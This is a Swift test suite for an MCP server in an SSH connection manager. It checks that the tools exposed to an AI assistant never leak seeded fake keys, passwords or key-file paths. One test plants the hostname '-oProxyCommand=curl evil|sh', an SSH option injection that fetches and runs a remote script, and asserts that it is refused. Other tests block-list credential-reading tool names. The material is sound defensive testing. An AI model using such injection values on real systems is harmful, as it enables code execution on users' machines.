import AinkradAppKit
import Foundation
import Testing

@testable import LeylineFeature

// MARK: - harness

/// A recognisable fake secret. Chosen so a substring search cannot produce a
/// false negative: it shares no prefix with any label, host or id in the
/// fixtures, and it is long enough that a truncated leak still matches.
private let secretMarker = "AINKRAD-FAKE-SECRET-MATERIAL-DO-NOT-LEAK-8F2A"

/// Everything a leak could plausibly look like, including the shapes a real
/// private key/passphrase/password would take.
private let secretValues: [String] = [
    "-----BEGIN OPENSSH PRIVATE KEY-----\n\(secretMarker)\n-----END OPENSSH PRIVATE KEY-----",
    "passphrase-\(secretMarker)",
    "password-\(secretMarker)",
]

/// Builds a store seeded with a real key + connections, whose secrets are the
/// markers above.
///
/// **Never touches the user's real Leyline store or Keychain**: `FakeDocs` is
/// in-memory and `FakeSecrets` stands in for the host's Keychain-backed store,
/// so nothing in this file can read or write a real credential.
@MainActor
private func makeFixture() -> (
    store: LeylineStore, secrets: FakeSecrets,
    keyConn: LeylineConnection, passwordConn: LeylineConnection,
    key: LeylineKey
) {
    let secrets = FakeSecrets()
    let store = LeylineStore(documents: FakeDocs(), secrets: secrets)
    let key = store.importKey(
        label: "Prod deploy key",
        privateKey: secretValues[0],
        passphrase: secretValues[1])
    let keyConn = store.addConnection(
        label: "Prod web", host: "web.example.com", port: 2222,
        username: "deploy", authMode: .key, keyID: key.id,
        password: nil)
    let passwordConn = store.addConnection(
        label: "Legacy box", host: "legacy.example.com",
        port: 22, username: "root", authMode: .password,
        keyID: nil, password: secretValues[2])
    return (store, secrets, keyConn, passwordConn, key)
}

/// A launcher that records what it was asked to open and answers with a
/// scripted outcome, so every `PluginLaunchOutcome` case is reachable without a
/// live host.
@MainActor
private final class FakeLauncher: PluginAppLauncher, PluginAppLauncherResult {
    var outcome: PluginLaunchOutcome = .opened
    private(set) var opened: [(appID: String, payload: String?)] = []

    func open(appID: String, payload: String?) { opened.append((appID, payload)) }
    /// Unused: Leyline is always the SENDER of a launch payload, never the
    /// target. Present only to satisfy the protocol.
    func takePendingLaunch() -> String? { nil }
    func openReportingOutcome(appID: String, payload: String?) -> PluginLaunchOutcome {
        opened.append((appID, payload))
        return outcome
    }
}

@MainActor
private func makeServer(store: LeylineStore, launcher: PluginAppLauncher)
    -> (MCPAppServer, [String])
{
    let operations = LeylineMCPOperations(
        catalog: LeylineCatalog(store: store, launcher: launcher))
    return LeylineMCPServer.make(appID: "leyline", perform: { await operations.run($0) })
}

@MainActor
private func listedTools(_ server: MCPAppServer) async -> [[String: Any]] {
    let reply = await server.handle(#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#)
    guard let data = reply.data(using: .utf8),
        let root = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any],
        let result = root["result"] as? [String: Any],
        let tools = result["tools"] as? [[String: Any]]
    else { return [] }
    return tools
}

@MainActor
private func call(
    _ server: MCPAppServer, _ name: String,
    _ arguments: [String: Any]
) async -> (text: String, isError: Bool) {
    let request: [String: Any] = [
        "jsonrpc": "2.0", "id": 7, "method": "tools/call",
        "params": ["name": name, "arguments": arguments],
    ]
    let data = try! JSONSerialization.data(withJSONObject: request)
    let reply = await server.handle(String(decoding: data, as: UTF8.self))
    guard let replyData = reply.data(using: .utf8),
        let root = (try? JSONSerialization.jsonObject(with: replyData)) as? [String: Any],
        let result = root["result"] as? [String: Any],
        let content = result["content"] as? [[String: Any]]
    else {
        return ("<no result>", true)
    }
    return (content.first?["text"] as? String ?? "", result["isError"] as? Bool ?? false)
}

private func annotation(_ tool: [String: Any], _ key: String) -> Bool {
    (tool["annotations"] as? [String: Any])?[key] as? Bool ?? false
}

// MARK: - THE credential test

@Suite(
    "Leyline MCP — no published tool can reach credential material",
    .timeLimit(.minutes(1)))
@MainActor
struct LeylineMCPCredentialLeakTests {

    /// **The single most important test in this change.**
    ///
    /// Seeds the store with a recognisable fake private key, passphrase and
    /// password, then drives EVERY published tool — through the real JSON-RPC
    /// server, not the sink directly — across success paths, failure paths and
    /// hostile arguments, and asserts the marker appears in no reply.
    ///
    /// A model that can read a private key can paste it into a chat transcript,
    /// and transcripts are persisted and shareable. So the assertion covers
    /// error text and unknown-id text too, not just success content: an error
    /// message that echoes what it found is the classic way a secret escapes a
    /// surface that "doesn't return secrets".
    ///
    /// This is a backstop. The primary guarantee is structural — see
    /// `LeylineCatalog`: `LeylineMCPOperations` holds no `LeylineStore`, so
    /// `privateKey(for:)` / `passphrase(for:)` / `password(for:)` are not in
    /// scope there and cannot be called at all. This test proves the property
    /// end-to-end so a future refactor that reintroduces the store fails here.
    @Test("no published tool's output ever contains seeded secret material")
    func noToolCanEmitSecretMaterial() async {
        let fixture = makeFixture()
        let launcher = FakeLauncher()
        let (server, failures) = makeServer(store: fixture.store, launcher: launcher)
        #expect(failures.isEmpty)

        // Sanity: the secrets really ARE in the store this server was built
        // over. Without this the test could pass by testing nothing.
        #expect(fixture.store.privateKey(for: fixture.key) == secretValues[0])
        #expect(fixture.store.passphrase(for: fixture.key) == secretValues[1])
        #expect(fixture.store.password(for: fixture.passwordConn) == secretValues[2])

        // Every published tool, crossed with arguments that cover the happy
        // path, the not-found path, the malformed path, and an attempt to talk
        // the tool into echoing a secret back.
        var calls: [(String, [String: Any])] = [
            ("list_connections", [:]),
            ("list_connections", ["query": "prod"]),
            ("list_connections", ["query": secretMarker]),
            ("list_connections", ["query": 42]),
            ("list_keys", [:]),
            ("list_keys", ["query": secretMarker]),
            ("connect", ["connection": fixture.keyConn.id.uuidString]),
            ("connect", ["connection": fixture.passwordConn.id.uuidString]),
            ("connect", ["connection": "not-a-real-id"]),
            ("connect", ["connection": secretMarker]),
            ("connect", [:]),
            ("connect", ["connection": ""]),
        ]
        // …and the same set again with every launch failure the host can
        // report, because those take different text paths.
        for outcome in [
            PluginLaunchOutcome.unknownApp("rune"),
            .disabled("rune"),
            .refused(reason: "bad payload"),
        ] {
            launcher.outcome = outcome
            for (name, arguments) in calls where name == "connect" {
                let reply = await call(server, name, arguments)
                expectNoSecret(in: reply.text, tool: name, arguments: arguments)
            }
        }
        launcher.outcome = .opened
        calls.append(("list_connections", ["query": ""]))

        for (name, arguments) in calls {
            let reply = await call(server, name, arguments)
            expectNoSecret(in: reply.text, tool: name, arguments: arguments)
        }

        // The tool DESCRIPTIONS and schemas go into the model's context too, so
        // they are part of the surface and get the same assertion.
        for tool in await listedTools(server) {
            let encoded = (try? JSONSerialization.data(withJSONObject: tool)) ?? Data()
            expectNoSecret(
                in: String(decoding: encoded, as: UTF8.self),
                tool: "tools/list", arguments: [:])
        }

        // The payload handed to Rune is a channel the model never sees, and
        // it now legitimately carries a materialized identity path — but it must
        // still carry no key MATERIAL.
        for opened in launcher.opened {
            expectNoSecret(in: opened.payload ?? "", tool: "launch payload", arguments: [:])
        }

        // …and the path itself must not reach the model. It names a plaintext
        // copy of the private key, so a model that learns it can read the key
        // with any file-reading tool it has. Collect the paths actually produced
        // and assert no tool reply, error or tool description contains one.
        let paths = Set(launcher.opened.compactMap { SSHLaunchPayload(json: $0.payload)?.identityFile })
        #expect(!paths.isEmpty, "the key connection should have produced an identity path")
        var surface: [String] = []
        for (name, arguments) in calls { surface.append(await call(server, name, arguments).text) }
        for tool in await listedTools(server) {
            surface.append(
                String(
                    decoding: (try? JSONSerialization.data(withJSONObject: tool)) ?? Data(),
                    as: UTF8.self))
        }
        for text in surface {
            for path in paths {
                #expect(!text.contains(path), "a materialized key path reached tool output: \(text)")
            }
            #expect(!text.contains("Application Support"))
            #expect(!text.contains("Leyline/keys"))
        }
    }

    /// The published surface must not even NAME the credential-taking APIs, so
    /// a model cannot be coached into asking for one.
    @Test("no tool that takes or returns credential material is published")
    func credentialToolsAreNotPublished() async {
        let names = Set(LeylineMCPServer.tools.map(\.name))
        #expect(names == ["list_connections", "list_keys", "connect"])
        // Named explicitly rather than by pattern: these are the exact
        // `LeylineStore` entry points that read or write secret material.
        for forbidden in [
            "import_key", "set_password", "read_key", "get_password",
            "get_private_key", "add_connection", "update_connection",
            "remove_connection", "remove_key",
        ] {
            #expect(!names.contains(forbidden), "\(forbidden) must not be published")
        }
    }

    /// **The security property of the host-side bridge.**
    ///
    /// `leyline.resolve_connection` answers with `identityPath` — a filesystem
    /// path to a plaintext private key. It exists for the host's `SSHBackend`,
    /// which only host code invokes through `AgentActionRegistryHub`. If it ever
    /// became an MCP tool, a model could ask for that path and then read the key
    /// with any file-reading tool it has. Pin both halves: it is not in the
    /// published table, and the MCP sink has no operation that reaches it.
    @Test("resolve_connection is host-only and is not published as an MCP tool")
    func resolveConnectionIsNotAnMCPTool() async {
        let fixture = makeFixture()
        let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
        let published = Set(await listedTools(server).compactMap { $0["name"] as? String })
        #expect(published == ["list_connections", "list_keys", "connect"])
        for forbidden in [
            "resolve_connection", "leyline.resolve_connection",
            "resolveConnection", "connection_info",
        ] {
            #expect(!published.contains(forbidden), "\(forbidden) must not be published")
            #expect(!Set(LeylineMCPServer.tools.map(\.operation)).contains(forbidden))
            // Even naming the operation directly at the sink must not reach it.
            let operations = LeylineMCPOperations(
                catalog: LeylineCatalog(store: fixture.store, launcher: FakeLauncher()))
            let payload = #"{"operation":"\#(forbidden)","connection":"\#(fixture.keyConn.id.uuidString)"}"#
            let reply = await operations.run(payload)
            #expect(reply.isError)
            #expect(reply.text.contains("unknown operation"))
        }
    }

    /// The Keychain-lookup ids are not secrets, but publishing them is free
    /// reconnaissance with no benefit to the model.
    @Test("list output never includes Keychain secret ids or a materialized key path")
    func listOutputHasNoSecretIdentifiers() async {
        let fixture = makeFixture()
        let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
        let connections = await call(server, "list_connections", [:]).text
        let keys = await call(server, "list_keys", [:]).text
        for text in [connections, keys] {
            #expect(!text.contains(".password"))
            #expect(!text.contains(".private"))
            #expect(!text.contains(".passphrase"))
            #expect(!text.contains("Application Support"))
            #expect(!text.contains("Leyline/keys"))
        }
        // `hasPassphrase` is a property OF the secret and is deliberately not
        // reported; assert `list_keys` really is id + label only.
        #expect(keys == "\(fixture.key.id.uuidString)  Prod deploy key")
    }

    private func expectNoSecret(
        in text: String, tool: String, arguments: [String: Any],
        sourceLocation: SourceLocation = #_sourceLocation
    ) {
        #expect(
            !text.contains(secretMarker),
            "\(tool)\(arguments) leaked secret material: \(text)",
            sourceLocation: sourceLocation)
        for value in secretValues {
            #expect(
                !text.contains(value),
                "\(tool)\(arguments) leaked secret material: \(text)",
                sourceLocation: sourceLocation)
        }
        #expect(
            !text.contains("BEGIN OPENSSH PRIVATE KEY"),
            "\(tool)\(arguments) leaked a private key: \(text)",
            sourceLocation: sourceLocation)
    }
}

// MARK: - the published contract

@Suite("Leyline MCP server", .timeLimit(.minutes(1)))
@MainActor
struct LeylineMCPServerTests {

    @Test("the three tools carry the intended annotations")
    func annotations() async {
        let fixture = makeFixture()
        let (server, failures) = makeServer(store: fixture.store, launcher: FakeLauncher())
        #expect(failures.isEmpty)
        let tools = Dictionary(
            uniqueKeysWithValues: await listedTools(server)
                .map { ($0["name"] as? String ?? "", $0) })
        #expect(tools.count == 3)

        for name in ["list_connections", "list_keys"] {
            #expect(annotation(tools[name]!, "readOnlyHint"))
            #expect(!annotation(tools[name]!, "destructiveHint"))
        }
        // The judgement call: connect is not irreversible locally, but it opens
        // an authenticated session to a REMOTE machine on the user's behalf.
        #expect(annotation(tools["connect"]!, "destructiveHint"))
        #expect(!annotation(tools["connect"]!, "readOnlyHint"))

        // `requiresLiveApp` is false everywhere — Leyline's store is headless,
        // and connect opens TERMINAL's window, not Leyline's. Setting it would
        // pop an unrelated Leyline window on every assistant connect.
        for tool in tools.values {
            #expect(!annotation(tool, "ainkrad/requiresLiveApp"))
        }
    }

    @Test("list_connections reports id, label, user, host and port")
    func listConnections() async {
        let fixture = makeFixture()
        let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
        let reply = await call(server, "list_connections", [:])
        #expect(!reply.isError)
        #expect(reply.text.contains(fixture.keyConn.id.uuidString))
        #expect(reply.text.contains("Prod web"))
        #expect(reply.text.contains("deploy@web.example.com:2222"))
        #expect(reply.text.contains("key auth: Prod deploy key"))
        #expect(reply.text.contains("root@legacy.example.com:22"))
        #expect(reply.text.contains("password auth"))
    }

    @Test("list_connections filters with the app's own matcher")
    func listConnectionsFiltered() async {
        let fixture = makeFixture()
        let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
        let reply = await call(server, "list_connections", ["query": "LEGACY"])
        #expect(reply.text.contains("Legacy box"))
        #expect(!reply.text.contains("Prod web"))
    }

    @Test("connect hands Rune a validated ssh payload for the right host")
    func connectOpensTerminal() async {
        let fixture = makeFixture()
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let reply = await call(server, "connect", ["connection": fixture.keyConn.id.uuidString])
        #expect(!reply.isError)
        #expect(launcher.opened.count == 1)
        #expect(launcher.opened[0].appID == "rune")
        let payload = SSHLaunchPayload(json: launcher.opened[0].payload)
        #expect(payload?.host == "web.example.com")
        #expect(payload?.port == 2222)
        #expect(payload?.username == "deploy")
        // THE regression: an agent-initiated connect used to send
        // `identityFile: nil`, so ssh never saw the stored key and the user got
        // Permission denied. It now materializes exactly as the button does.
        let identity = try! #require(payload?.identityFile)
        #expect(identity.contains(fixture.key.id.uuidString))
        #expect(
            SSHCommand.string(for: fixture.keyConn, identityFile: identity)
                .contains("-i \(SSHCommand.shellQuote(identity))"))
        // …and the file it points at is only readable by its owner.
        let mode = (try! FileManager.default.attributesOfItem(atPath: identity))[.posixPermissions] as? Int
        #expect(mode == 0o600)
        // The result says which credential is in play, and never where it lives.
        #expect(reply.text.contains("SSH key stored in Leyline"))
        #expect(!reply.text.contains(identity))
    }

    @Test("connect on a password connection says a prompt is coming")
    func connectPasswordConnection() async {
        let fixture = makeFixture()
        let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
        let reply = await call(server, "connect", ["connection": fixture.passwordConn.id.uuidString])
        #expect(!reply.isError)
        #expect(reply.text.contains("prompt for the password"))
    }

    /// Revisits the earlier "id only" rule, in step with the host bridge. A
    /// label is addressable because the approval card the user reads shows the
    /// identifier verbatim; the ambiguity that motivated "id only" is answered
    /// by erroring on it (below), not by refusing every label.
    @Test("connect matches ids and unique labels case-insensitively, hosts never")
    func connectMatchesByIdOrUniqueLabel() async {
        let fixture = makeFixture()
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let lowered = await call(
            server, "connect",
            ["connection": fixture.keyConn.id.uuidString.lowercased()])
        #expect(!lowered.isError)
        let byLabel = await call(server, "connect", ["connection": "PROD WEB"])
        #expect(!byLabel.isError)
        #expect(launcher.opened.count == 2)
        #expect(SSHLaunchPayload(json: launcher.opened[1].payload)?.host == "web.example.com")
        // A hostname stays unaddressable: it is not a user-chosen name, and two
        // connections to one host with different usernames are normal.
        let byHost = await call(server, "connect", ["connection": "web.example.com"])
        #expect(byHost.isError)
        #expect(byHost.text.contains("list_connections"))
        #expect(launcher.opened.count == 2)
    }

    @Test("connect prefers an exact id over a connection LABELLED with that id")
    func connectIdBeatsLabel() async {
        let fixture = makeFixture()
        let launcher = FakeLauncher()
        _ = fixture.store.addConnection(
            label: fixture.keyConn.id.uuidString,
            host: "decoy.example.com", port: 22, username: "root",
            authMode: .key, keyID: fixture.key.id, password: nil)
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let reply = await call(server, "connect", ["connection": fixture.keyConn.id.uuidString])
        #expect(!reply.isError)
        #expect(SSHLaunchPayload(json: launcher.opened[0].payload)?.host == "web.example.com")
    }

    @Test("connect refuses an ambiguous label instead of guessing a machine")
    func connectAmbiguousLabel() async {
        let fixture = makeFixture()
        let launcher = FakeLauncher()
        _ = fixture.store.addConnection(
            label: "Prod web", host: "web2.example.com", port: 22,
            username: "deploy", authMode: .key, keyID: fixture.key.id,
            password: nil)
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let reply = await call(server, "connect", ["connection": "prod web"])
        #expect(reply.isError)
        #expect(reply.text.contains("2 saved connections share the label \"Prod web\""))
        #expect(reply.text.contains("pass the id"))
        // Nothing opened — ambiguity must never silently pick.
        #expect(launcher.opened.isEmpty)
    }
}

// MARK: - edge cases

@Suite("Leyline MCP edge cases", .timeLimit(.minutes(1)))
@MainActor
struct LeylineMCPEdgeCaseTests {

    @Test("an unknown connection id is an actionable error, not a crash")
    func unknownConnectionID() async {
        let fixture = makeFixture()
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let reply = await call(server, "connect", ["connection": UUID().uuidString])
        #expect(reply.isError)
        #expect(reply.text.contains("No saved connection has that id"))
        #expect(reply.text.contains("list_connections"))
        #expect(launcher.opened.isEmpty)
    }

    @Test("a missing or empty connection argument names the argument")
    func missingConnectionArgument() async {
        let fixture = makeFixture()
        let (server, _) = makeServer(store: fixture.store, launcher: FakeLauncher())
        for arguments in [[:], ["connection": ""], ["connection": "   "]] as [[String: Any]] {
            let reply = await call(server, "connect", arguments)
            #expect(reply.isError)
            #expect(reply.text.contains("connect requires a \"connection\""))
        }
    }

    @Test("Rune missing, disabled or refusing each gets its own actionable text")
    func terminalUnavailable() async {
        let fixture = makeFixture()
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: fixture.store, launcher: launcher)
        let expectations: [(PluginLaunchOutcome, String)] = [
            (.unknownApp("rune"), "isn't installed"),
            (.disabled("rune"), "is disabled"),
            (.refused(reason: "bad payload"), "bad payload"),
        ]
        for (outcome, fragment) in expectations {
            launcher.outcome = outcome
            let reply = await call(
                server, "connect",
                ["connection": fixture.keyConn.id.uuidString])
            #expect(reply.isError)
            #expect(reply.text.contains(fragment), "got: \(reply.text)")
            // Every one of these names the connection, so the model can say
            // WHICH host failed rather than "couldn't connect".
            #expect(reply.text.contains("Prod web"))
            #expect(!reply.text.isEmpty)
        }
    }

    @Test("an empty store answers every tool with an actionable message")
    func emptyStore() async {
        let store = LeylineStore(documents: FakeDocs(), secrets: FakeSecrets())
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: store, launcher: launcher)

        let connections = await call(server, "list_connections", [:])
        #expect(!connections.isError)
        #expect(connections.text.contains("no saved connections"))
        #expect(connections.text.contains("Leyline app"))

        let keys = await call(server, "list_keys", [:])
        #expect(!keys.isError)
        #expect(keys.text.contains("no imported SSH keys"))

        let connect = await call(server, "connect", ["connection": UUID().uuidString])
        #expect(connect.isError)
        #expect(connect.text.contains("no saved connections"))
        #expect(launcher.opened.isEmpty)
    }

    @Test("a connection with an ssh-option-like host is refused, not launched")
    func unsafeConnectionIsRefused() async {
        // `ssh -oProxyCommand=…` runs a shell command, so a hostname beginning
        // with a dash is code execution. `SSHLaunchPayload.validated()` closes
        // this for both repos; assert the MCP path actually calls it.
        let store = LeylineStore(documents: FakeDocs(), secrets: FakeSecrets())
        let conn = store.addConnection(
            label: "Evil", host: "-oProxyCommand=curl evil|sh",
            port: 22, username: "root", authMode: .password,
            keyID: nil, password: nil)
        let launcher = FakeLauncher()
        let (server, _) = makeServer(store: store, launcher: launcher)
        let reply = await call(server, "connect", ["connection": conn.id.uuidString])
        #expect(reply.isError)
        #expect(reply.text.contains("unsafe host"))
        #expect(launcher.opened.isEmpty)
    }

    @Test("no live-app-only tool exists, because the store works headless")
    func nothingRequiresTheLeylineWindow() async {
        let store = LeylineStore(documents: FakeDocs(), secrets: FakeSecrets())
        let (server, _) = makeServer(store: store, launcher: FakeLauncher())
        for tool in await listedTools(server) {
            #expect(!annotation(tool, "ainkrad/requiresLiveApp"))
        }
    }

    /// The guard machinery is unused by the live table (Leyline has no argument
    /// that decides irreversibility), so exercise it through a fixture — if it
    /// ever gains a real user, the mechanism is already proven.
    @Test("the reject/inject gate still works for a future guarded argument")
    func guardMachineryWorks() async {
        #expect(LeylineMCPServer.tools.allSatisfy { $0.rejects.isEmpty && $0.injects.isEmpty })

        var seen: [String] = []
        let sink: @MainActor @Sendable (String) async -> AgentActionResult = { json in
            seen.append(json)
            return AgentActionResult(text: "ok", isError: false)
        }
        let guarded = LeylineMCPServer.Tool(
            "fixture", "fixture", "",
            schemaJSON: #"{"type":"object"}"#,
            rejects: [.init("force", .bool(true))])
        let refused = await LeylineMCPServer.invoke(
            guarded, arguments: #"{"force":true}"#, perform: sink)
        #expect(refused.isError)
        #expect(seen.isEmpty)

        let twin = LeylineMCPServer.Tool(
            "fixture_forced", "fixture", "", destructive: true,
            schemaJSON: #"{"type":"object"}"#,
            injects: [.init("force", .bool(true))])
        let allowed = await LeylineMCPServer.invoke(twin, arguments: "{}", perform: sink)
        #expect(!allowed.isError)
        let object =
            (try? JSONSerialization.jsonObject(
                with: Data(seen[0].utf8))) as? [String: Any]
        #expect(object?["force"] as? Bool == true)
        #expect(object?["operation"] as? String == "fixture")
    }

    @Test("malformed arguments are rejected without reaching the sink")
    func malformedArguments() async {
        var reached = false
        let result = await LeylineMCPServer.invoke(
            LeylineMCPServer.tools[0], arguments: "not json",
            perform: { _ in
                reached = true
                return AgentActionResult(text: "", isError: false)
            })
        #expect(result.isError)
        #expect(!reached)
    }
}
